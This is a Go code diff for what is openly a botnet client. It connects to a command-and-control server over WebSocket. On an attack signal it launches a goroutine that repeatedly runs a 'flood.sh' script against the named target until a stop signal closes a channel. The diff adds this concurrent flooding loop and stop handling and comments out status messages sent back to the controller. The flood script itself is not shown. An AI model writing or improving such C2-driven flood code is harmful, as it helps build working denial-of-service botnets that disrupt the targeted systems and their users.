@@ -24,10 +24,11 @@ type Bot struct {
 	Addr   string
 	Master string
 	Conn   *websocket.Conn
+	Stop   chan struct{} // Concurrent listener to not block WS listener
 }
 
 func NewBot(addr, master string) *Bot {
-	return &Bot{Addr: addr, Master: master}
+	return &Bot{Addr: addr, Master: master, Stop: make(chan struct{})}
 }
 
 // Attempts to establish a WS connection with the C2 layer
@@ -48,10 +49,10 @@ func (b *Bot) Execute(fpath string, args string) error {
 	args = strings.TrimSpace(args)
 	if args == "" {
 		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!", fpath)
-		b.Conn.WriteJSON(Message{
+		/* b.Conn.WriteJSON(Message{
 			Payload: errMsg,
 			From:    b.Addr,
-		})
+		}) */
 
 		return fmt.Errorf(errMsg)
 	}
@@ -61,20 +62,20 @@ func (b *Bot) Execute(fpath string, args string) error {
 	cmd := exec.Command("bash", fpath, args)
 	if output, err := cmd.CombinedOutput(); err != nil {
 		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fpath, err, output)
-		b.Conn.WriteJSON(Message{
+		/* b.Conn.WriteJSON(Message{
 			Payload: errMsg,
 			From:    b.Addr,
-		})
+		}) */
 
 		return fmt.Errorf(errMsg)
 	}
 
 	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fpath, args)
 	log.Printf(successMsg)
-	b.Conn.WriteJSON(Message{
+	/* b.Conn.WriteJSON(Message{
 		Payload: successMsg,
 		From:    b.Addr,
-	})
+	}) */
 
 	return nil
 }
@@ -98,12 +99,35 @@ func (b *Bot) Listen() error {
 
 		log.Printf("[C] Received: %s", msg.Payload)
 		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
+			target := strings.Split(msg.Payload, SIGNAL_ATK)[1]
+			stop := b.Stop
 
-			// NOTE: This is the absolute path within the Docker container
-			if err := b.Execute("/app/bot/flood.sh", strings.Split(msg.Payload, SIGNAL_ATK)[1]); err != nil {
-				log.Printf(err.Error())
+			go func() { // Starts attack concurrently
+				for {
+					select {
+					case <-stop: // Received stop signal
+						return
+
+					default:
+						if err := b.Execute("/app/bot/flood.sh", target); err != nil { // NOTE: absolute path within container
+							log.Printf(err.Error())
+							return
+						}
+					}
+				}
+			}()
+
+		}
+
+		if msg.Payload == SIGNAL_STP {
+			select {
+			case <-b.Stop:
+				// Already stopped
+			default:
+				close(b.Stop) // Trigger attack termination
 			}
 
+			b.Stop = make(chan struct{})
 		}
 	}
 }
